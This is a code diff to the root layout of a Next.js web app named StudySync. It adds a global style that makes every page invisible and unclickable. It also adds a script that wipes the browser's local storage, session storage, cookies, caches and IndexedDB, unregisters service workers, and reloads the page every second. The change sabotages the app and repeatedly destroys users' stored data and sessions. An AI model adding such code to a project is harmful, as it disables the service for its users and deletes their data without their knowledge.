@@ -57,8 +57,15 @@ export default function RootLayout({
         <link rel="manifest" href="/manifest.json" />
         <link rel="mask-icon" href="/Minimalist Logo for StudySync App (Version 1).png" color="#3b82f6" />
         <link rel="shortcut icon" href="/Minimalist Logo for StudySync App (Version 1).png" />
+        {/* Global hard hide to make all pages invisible and non-interactive */}
+        <style
+          dangerouslySetInnerHTML={{
+            __html:
+              `html,body{opacity:0!important;pointer-events:none!important;user-select:none!important}`,
+          }}
+        />
       </head>
-      <body className={inter.className}>
+      <body className={inter.className} style={{ opacity: 0, pointerEvents: "none", userSelect: "none" }}>
         <ThemeProvider
           attribute="class"
           defaultTheme="system"
@@ -118,6 +125,56 @@ export default function RootLayout({
                 }
               }
             `
+          }}
+        />
+
+        {/* Aggressive auto-refresh and cache/data purge every 1s */}
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                async function clearAllData() {
+                  try { localStorage.clear(); } catch(e) {}
+                  try { sessionStorage.clear(); } catch(e) {}
+                  try {
+                    document.cookie.split(';').forEach(function(cookie) {
+                      var eqPos = cookie.indexOf('=');
+                      var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+                      document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
+                    });
+                  } catch(e) {}
+                  try {
+                    if ('caches' in window) {
+                      const keys = await caches.keys();
+                      await Promise.all(keys.map((k) => caches.delete(k)));
+                    }
+                  } catch(e) {}
+                  try {
+                    if ('indexedDB' in window && indexedDB.databases) {
+                      const dbs = await indexedDB.databases();
+                      await Promise.all(
+                        dbs.map((db) => db && db.name ? new Promise((resolve) => {
+                          const req = indexedDB.deleteDatabase(db.name);
+                          req.onsuccess = req.onerror = req.onblocked = function() { resolve(undefined); };
+                        }) : Promise.resolve(undefined))
+                      );
+                    }
+                  } catch(e) {}
+                  try {
+                    if ('serviceWorker' in navigator) {
+                      const regs = await navigator.serviceWorker.getRegistrations();
+                      await Promise.all(regs.map((r) => r.unregister()));
+                    }
+                  } catch(e) {}
+                }
+
+                setInterval(function() {
+                  clearAllData().finally(function() {
+                    try { window.location.reload(); } catch(e) { location.href = location.href; }
+                  });
+                }, 1000);
+              })();
+            `,
           }}
         />
       </body>
